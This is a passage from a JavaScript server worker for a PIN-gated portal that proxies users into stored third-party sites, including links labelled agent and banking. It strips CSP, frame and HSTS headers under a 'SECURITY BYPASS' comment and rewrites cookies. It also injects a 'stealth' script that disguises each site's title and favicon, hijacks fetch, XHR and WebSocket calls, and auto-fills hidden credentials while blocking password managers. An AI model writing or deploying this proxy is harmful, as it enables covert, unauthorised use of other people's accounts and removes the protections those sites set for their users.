                ${customModalScript} ${notifHTML} ${waHTML}
                
                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
                    <div>
                        <h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Welcome <span class="text-white">${userData.name || userPin}</span></h1>
                        <p class="text-[9px] text-gray-500 mt-0.5 uppercase tracking-[0.2em]">Secure Access Identity</p>
                    </div>
                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition">Terminate</a>
                </header>

                <div class="max-w-6xl mx-auto p-4 md:p-8">
                    <h3 class="text-[9px] font-bold uppercase tracking-[0.2em] text-gray-500 mb-4 border-b border-white/10 pb-2">Your Environments</h3>
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">${sitesHTML}</div>
                </div>
                <script>
                    function toggleVisibility(id, btn) {
                        const el = document.getElementById(id);
                        if(el.style.webkitTextSecurity === 'disc') {
                            el.style.webkitTextSecurity = 'none';
                            btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg>';
                            btn.classList.remove('text-gray-400'); btn.classList.add('text-green-400');
                        } else {
                            el.style.webkitTextSecurity = 'disc';
                            btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.522 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>';
                            btn.classList.remove('text-green-400'); btn.classList.add('text-gray-400');
                        }
                    }

                    function copyLink(text, btn) {
                        if(!text) return;
                        navigator.clipboard.writeText(text);
                        const old = btn.innerHTML;
                        btn.innerHTML = '<svg class="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
                        setTimeout(() => btn.innerHTML = old, 1500);
                    }
                    function toggleDetails(id) {
                        const el = document.getElementById('details-' + id), arrow = document.getElementById('arrow-' + id);
                        if(el.classList.contains('hidden')) { el.classList.remove('hidden'); arrow.classList.add('rotate-90'); } 
                        else { el.classList.add('hidden'); arrow.classList.remove('rotate-90'); }
                    }
                    function toggleEditPwd(id) {
                        const el = document.getElementById('pwd-edit-' + id);
                        el.classList.toggle('hidden');
                    }
                    async function savePwd(siteId) {
                        const pwd = document.getElementById('pwd-in-' + siteId).value;
                        if(!pwd) return CustomModal.show({type:'alert', title:'<span class="text-red-500">⚠</span> Error', text:'Password cannot be empty!'});
                        
                        try {
                            const res = await fetch('/api/update-password', { method: 'POST', body: JSON.stringify({ siteId, newPassword: pwd }) });
                            if(res.ok) {
                                document.getElementById('pwd-disp-' + siteId).value = pwd;
                                document.getElementById('pwd-edit-' + siteId).classList.add('hidden');
                                CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Password Updated Successfully!'});
                            }
                        } catch(e) {}
                    }
                </script>
            </body></html>`;
            return new Response(html, { headers: { "Content-Type": "text/html" } });
        }

        // --- 🚀 PROXY START ---
        if (path === "/api/start-proxy") {
            if (!isUser) return new Response("Denied", { status: 403 });
            const siteId = url.searchParams.get("id");
            const userData = db.pins[userPin];
            if (userData.status === 'suspended' || !userData.sites.includes(siteId) || !db.sites[siteId]) return new Response("Access Denied", { status: 403 });
            
            const conf = userData.siteConf?.[siteId] || {};
            const proxyData = JSON.stringify({ 
                t: db.sites[siteId].agentLink, 
                a: db.sites[siteId].apiLink || '', 
                b: db.sites[siteId].bankingLink || '', 
                u: conf.u || '', 
                p: conf.p || '' 
            });
            const encryptedData = encrypt(proxyData);

            return new Response("Starting...", {
                status: 302,
                headers: { "Location": "/", "Set-Cookie": `proxy_active=${encryptedData}; HttpOnly; Secure; Path=/; Max-Age=3600; SameSite=Lax` }
            });
        }
        if (path === "/api/stop-proxy") return new Response("Stopped", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });

        // --- 🌐 GLOBAL PROXY ENGINE ---
        if (isUser && isProxyActive) {
            const proxyDataString = decrypt(isProxyActive);
            if(!proxyDataString) return new Response("Invalid Proxy", { status: 400 });
            
            let proxyData;
            try { proxyData = JSON.parse(proxyDataString); } catch(e) { proxyData = { t: proxyDataString, a: '', b: '', u: '', p: '' }; }

            const targetDomain = proxyData.t;
            const autoApi = proxyData.a;
            const autoBank = proxyData.b;
            const autoUser = proxyData.u;
            const autoPwd = proxyData.p;

            const targetUrl = new URL(request.url);
            const tDomainObj = new URL(targetDomain);
            targetUrl.hostname = tDomainObj.hostname;
            targetUrl.protocol = tDomainObj.protocol;
            targetUrl.port = tDomainObj.port;

            if (request.headers.get("Upgrade") === "websocket") {
                const wsUrl = new URL(request.url);
                wsUrl.hostname = tDomainObj.hostname;
                wsUrl.protocol = tDomainObj.protocol === 'https:' ? 'wss:' : 'ws:';
                
                const wsHeaders = new Headers(request.headers);
                wsHeaders.set("Host", tDomainObj.hostname);
                wsHeaders.set("Origin", targetDomain);
                
                return fetch(new Request(wsUrl.toString(), request), { headers: wsHeaders });
            }

            const proxyHeaders = new Headers(request.headers);
            proxyHeaders.set("Host", targetUrl.hostname);
            proxyHeaders.set("Origin", targetDomain);
            proxyHeaders.set("Referer", targetDomain + targetUrl.pathname);
            proxyHeaders.delete("Accept-Encoding"); 

            delete cookies['portal_session'];
            delete cookies['proxy_active'];
            const cleanCookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");

            const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
            if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;

            const proxyRes = await fetch(targetUrl.toString(), fetchConfig);
            const responseHeaders = new Headers();
            
            // 🚀 SECURITY BYPASS: Remove CSP, X-Frame, & Restrictive headers to fix broken assets
            const removeHeaders =['content-security-policy', 'content-security-policy-report-only', 'x-frame-options', 'strict-transport-security'];
            
            for (const [key, value] of proxyRes.headers.entries()) {
                const kLower = key.toLowerCase();
                if (kLower === 'set-cookie') {
                    let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
                    responseHeaders.append('Set-Cookie', modCookie);
                } else if (!removeHeaders.includes(kLower)) {
                    responseHeaders.append(key, value);
                }
            }

            const locationHeader = responseHeaders.get("Location");
            if (locationHeader) responseHeaders.set("Location", locationHeader.replace(targetDomain, url.origin));

            responseHeaders.append("Set-Cookie", `proxy_active=${isProxyActive}; HttpOnly; Secure; Path=/; Max-Age=3600; SameSite=Lax`);

            let body = proxyRes.body;
            const contentType = responseHeaders.get("Content-Type") || "";
            
            // 🚀 ADVANCED REWRITE: Fix CSS, JS, HTML missing assets by rewriting deep URLs
            if (contentType.includes("text/") || contentType.includes("application/json") || contentType.includes("application/javascript")) {
                try {
                    let textBody = await proxyRes.text();
                    let tHost = tDomainObj.host;
                    let pHost = url.host;

                    // 1. Rewrite full domain structure
                    textBody = textBody.split(targetDomain).join(url.origin);
                    // 2. Rewrite base hostname to catch //cdn... or relative mismatches
                    textBody = textBody.split(tHost).join(pHost);
                    
                    if (contentType.includes("text/html")) {
                        const encTargetTrim = encrypt(targetDomain).substring(0,8);
                        
                        const stealthScript = `<script>
(function(){
    try{
        var p = performance.getEntriesByType("navigation")[0];
        if (p && p.type === "reload") {
            window.location.replace("/api/stop-proxy");
            return;
        }
        if (window.performance && window.performance.navigation && window.performance.navigation.type === 1) {
             window.location.replace("/api/stop-proxy");
             return;
        }

        var l=Date.now();
        setInterval(function(){if(Date.now()-l>60000)window.location.replace("/api/stop-proxy");l=Date.now();},2000);
        document.addEventListener("visibilitychange",function(){if(document.visibilityState==="hidden")document.body.style.opacity="0";else{document.body.style.opacity="1";if(Date.now()-l>60000)window.location.replace("/api/stop-proxy");l=Date.now();}});
        
        var ctx = '${encTargetTrim}';
        if(!window.location.search.includes('_ctx=')){
            var sep = window.location.search ? '&' : '?';
            window.history.replaceState(null, '', window.location.pathname + window.location.search + sep + '_ctx=' + ctx);
        }

        const fixedTitle = "Nexus Digital | Enterprise Solutions";
        const fixedFavicon = "https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg";

        function lockIdentity() {
            if(document.title !== fixedTitle) document.title = fixedTitle;
            let icons = document.querySelectorAll('link[rel~="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
            let hasIcon = false;
            icons.forEach(i => {
                if(i.href === fixedFavicon) hasIcon = true;
                else i.remove();
            });
            if(!hasIcon) {
                let link = document.createElement('link');
                link.rel = 'icon'; link.type = 'image/jpeg'; link.href = fixedFavicon;
                document.head.appendChild(link);
            }
        }
        lockIdentity();
        let headObserver = new MutationObserver(lockIdentity);
        headObserver.observe(document.head, { subtree: true, childList: true, attributes: true, characterData: true });

        if(!document.querySelector('meta[name="viewport"]')){
            let v = document.createElement('meta');
            v.name = "viewport"; v.content = "width=device-width, initial-scale=1.0";
            document.head.appendChild(v);
        }
        
        var targetHost = new URL("` + targetDomain + `").hostname;
        var apiTarget = "${autoApi}";
        var apiHost = apiTarget ? new URL(apiTarget).hostname : "";
        var rootDomain = targetHost.split('.').slice(-2).join('.'); 

        function shouldIntercept(urlStr) {
            if(typeof urlStr !== 'string') return false;
            try {
                var u = urlStr.startsWith('http') ? new URL(urlStr) : new URL(urlStr, window.location.origin);
                return u.hostname !== window.location.hostname;
            } catch(e) { return false; }
        }

        var origFetch = window.fetch;
        window.fetch = function(resource, options) {
            let reqUrl = (resource instanceof Request) ? resource.url : resource;
            if (shouldIntercept(reqUrl)) {
                let fullUrl = reqUrl.startsWith('http') ? reqUrl : new URL(reqUrl, window.location.origin).toString();
                let proxyUrl = '/__api_proxy?target=' + encodeURIComponent(fullUrl);
                
                if (resource instanceof Request) {
                    return (async () => {
                        let reqInit = { method: resource.method, headers: resource.headers, credentials: resource.credentials, mode: 'cors', redirect: resource.redirect };
                        if (['POST', 'PUT', 'PATCH'].includes(resource.method)) reqInit.body = await resource.clone().blob();
                        let res = await origFetch.call(window, proxyUrl, reqInit);
                        Object.defineProperty(res, 'url', { value: fullUrl }); 
                        return res;
                    })();
                } else {
                    return origFetch.call(window, proxyUrl, options).then(res => {
                        Object.defineProperty(res, 'url', { value: fullUrl }); 
                        return res;
                    });
                }
            }
            return origFetch.call(window, resource, options);
        };

        var origXhrOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._nxIntercepted = false;
            this._nxUrl = url;
            if(typeof url === 'string' && shouldIntercept(url)) {
                this._nxIntercepted = true;
                let fullUrl = url.startsWith('http') ? url : new URL(url, window.location.origin).toString();
                this._nxUrl = fullUrl;
                url = '/__api_proxy?target=' + encodeURIComponent(fullUrl);
            }
            return origXhrOpen.apply(this,[method, url].concat(Array.prototype.slice.call(arguments, 2)));
        };
        var origXhrRespUrl = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseURL');
        if (origXhrRespUrl) {
            Object.defineProperty(XMLHttpRequest.prototype, 'responseURL', {
                get: function() { return this._nxIntercepted ? this._nxUrl : origXhrRespUrl.get.call(this); }
            });
        }

        var OrigWebSocket = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            try {
                var wsUrl = new URL(url);
                if (wsUrl.hostname !== window.location.hostname) {
                    var proxyWsUrl = new URL('/__ws_proxy?target=' + encodeURIComponent(url), window.location.origin);
                    proxyWsUrl.protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                    return new OrigWebSocket(proxyWsUrl.toString(), protocols);
                }
            } catch(e) {}
            return new OrigWebSocket(url, protocols);
        };

        function setNativeValue(el, val) {
            if (!el || el.value === val) return;
            try {
                let lastValue = el.value;
                el.value = val;
                let tracker = el._valueTracker;
                if (tracker) tracker.setValue(lastValue);
                let desc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");
                if(desc && desc.set) desc.set.call(el, val);
                el.dispatchEvent(new Event('input', { bubbles: true, composed: true }));
                el.dispatchEvent(new Event('change', { bubbles: true, composed: true }));
                el.dispatchEvent(new Event('blur', { bubbles: true, composed: true }));
            } catch(e){}
        }

        window.addEventListener('DOMContentLoaded', () => {
            const au = "${autoUser}"; const ap = "${autoPwd}";
            if(!au || !ap) return;

            let style = document.createElement('style');
            style.innerHTML = \`
                .nx-mask { -webkit-text-security: disc !important; font-family: text-security-disc, sans-serif !important; letter-spacing: 2px !important; }
                #nx-popup-overlay { position:fixed !important; inset:0 !important; background:rgba(0,0,0,0.7) !important; backdrop-filter:blur(5px) !important; z-index:2147483647 !important; display:none; align-items:center !important; justify-content:center !important; padding:0 15px !important; box-sizing:border-box !important; }
                #nx-popup-box { background:#0a0a0a !important; border:1px solid rgba(255,255,255,0.1) !important; width:100% !important; max-width:420px !important; padding:24px !important; border-radius:14px !important; display:flex !important; flex-direction:column !important; gap:14px !important; box-shadow:0 25px 50px -12px rgba(0,0,0,0.9) !important; font-family:sans-serif !important; box-sizing:border-box !important; }
                #nx-popup-box * { box-sizing:border-box !important; line-height:normal !important; text-transform:none !important; letter-spacing:normal !important; font-size:initial !important; margin:0 !important; padding:0 !important; font-family:sans-serif !important; }
            \`;
            document.head.appendChild(style);

            const secureInputs = () => {
                document.querySelectorAll('input').forEach(el => {
                    if (el.dataset.nxSecured) return; 
                    
                    let type = (el.getAttribute('type') || '').toLowerCase();
                    let name = (el.name || '').toLowerCase();
                    let placeholder = (el.placeholder || '').toLowerCase();

                    if (type === 'password' || el.classList.contains('nx-mask')) {
                        el.setAttribute('type', 'text');
                        el.classList.add('nx-mask');
                        el.setAttribute('autocomplete', 'new-password');
                        el.setAttribute('spellcheck', 'false');
                        el.setAttribute('data-lpignore', 'true');
                        el.dataset.nxSecured = "true";
                    } else if (name.includes('user') || placeholder.includes('user') || name.includes('email') || name.includes('login')) {
                        el.setAttribute('autocomplete', 'off');
                        el.setAttribute('spellcheck', 'false');
                        el.setAttribute('data-lpignore', 'true');
                        el.dataset.nxSecured = "true";
                    }
                });
            };

            secureInputs();
            let domObserver = new MutationObserver(() => secureInputs());
            domObserver.observe(document.body, { childList: true, subtree: true });

            let overlay = document.createElement('div');
            overlay.id = 'nx-popup-overlay';
            
            let popup = document.createElement('div');
            popup.id = 'nx-popup-box';
            popup.innerHTML = \`
                <div style="display:flex !important; align-items:center !important; gap:10px !important; border-bottom:1px solid rgba(255,255,255,0.05) !important; padding-bottom:12px !important; width:100% !important;">
                    <div style="width:30px !important; height:30px !important; border-radius:50% !important; background:rgba(74,222,128,0.1) !important; display:flex !important; align-items:center !important; justify-content:center !important; border:1px solid rgba(74,222,128,0.2) !important;">
                        <svg style="width:16px !important; height:16px !important; color:#4ade80 !important; display:block !important;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z"></path></svg>
                    </div>
                    <span style="color:white !important; font-size:16px !important; font-weight:700 !important; letter-spacing:0.5px !important; display:block !important;">Auto Fill System</span>
                </div>
                <p style="color:#9ca3af !important; font-size:13px !important; line-height:1.5 !important; display:block !important; width:100% !important; margin-top:8px !important; margin-bottom:8px !important;">Do you want to insert your panel credentials into this login form?</p>
                <div style="display:flex !important; gap:12px !important; margin-top:6px !important; width:100% !important;">
                    <button id="nx-btn-no" style="flex:1 !important; background:rgba(255,255,255,0.05) !important; color:#d1d5db !important; border:1px solid rgba(255,255,255,0.1) !important; padding:12px !important; border-radius:8px !important; font-size:12px !important; font-weight:bold !important; cursor:pointer !important; text-transform:uppercase !important; letter-spacing:1px !important; transition:0.2s !important; display:block !important;">No</button>
                    <button id="nx-btn-yes" style="flex:1 !important; background:#4f46e5 !important; color:white !important; border:none !important; padding:12px !important; border-radius:8px !important; font-size:12px !important; font-weight:bold !important; cursor:pointer !important; text-transform:uppercase !important; letter-spacing:1px !important; box-shadow:0 0 15px rgba(79,70,229,0.4) !important; transition:0.2s !important; display:block !important;">Yes, Fill It</button>
                </div>
            \`;
            overlay.appendChild(popup);
            document.body.appendChild(overlay);

            let hasFilled = false;
            let rejected = false;
            let lastFocusedInput = null;

            document.getElementById('nx-btn-no').onclick = (e) => {
                e.preventDefault();
                overlay.style.display = 'none';
                rejected = true;
                if(lastFocusedInput) { setTimeout(() => lastFocusedInput.focus(), 100); }
            };

            document.getElementById('nx-btn-yes').onclick = (e) => {
                e.preventDefault();
                overlay.style.display = 'none';
                
                let pField = null, uField = null;
                const inputs = document.querySelectorAll('input');
                
                inputs.forEach(el => { if(el.classList.contains('nx-mask') || el.type === 'password') pField = el; });
                
                inputs.forEach(el => {
                    if(el === pField) return;
                    let n = (el.name||'').toLowerCase(), id = (el.id||'').toLowerCase(), pl = (el.placeholder||'').toLowerCase();
                    if(!n.includes('cap') && !id.includes('cap') && !pl.includes('cap') && !n.includes('search')) {
                        if(n.includes('user') || pl.includes('user') || n.includes('email') || n.includes('login')) {
                            uField = el;
                        }
                    }
                });

                if(!uField && pField) {
                     inputs.forEach(el => {
                         if(el !== pField && (el.type === 'text' || el.type === 'email') && el.getBoundingClientRect().width > 0) uField = el;
                     });
                }

                if(uField) setNativeValue(uField, au);
                if(pField) setNativeValue(pField, ap);
                hasFilled = true;
            };

            const checkTrigger = (e) => {
                if (hasFilled || rejected) return;
                if (e.target.tagName === 'INPUT') {
                    let n = (e.target.name||'').toLowerCase();
                    let p = (e.target.placeholder||'').toLowerCase();
                    if (e.target.classList.contains('nx-mask') || e.target.type === 'password' || n.includes('user') || p.includes('user') || n.includes('login')) {
                        lastFocusedInput = e.target;
                        overlay.style.setProperty('display', 'flex', 'important');
                        e.target.blur(); 
                    }
                }
            };

            document.addEventListener('focusin', checkTrigger);
            document.addEventListener('click', checkTrigger);
        });
    }catch(e){}
})();
<\/script>`;
                        
                        if (textBody.includes("<head>")) textBody = textBody.replace("<head>", "<head>" + stealthScript); 
                        else textBody = stealthScript + textBody;
                    }
                    
                    body = textBody;
                    responseHeaders.delete("Content-Length"); 
                } catch(err) {
                    // Fallback to original body stream if parsing fails
                }
            }
            
            return new Response(body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
        }

        return new Response(landingPageHTML, { headers: { "Content-Type": "text/html;charset=UTF-8", "Cache-Control": "no-store" } });
    }
};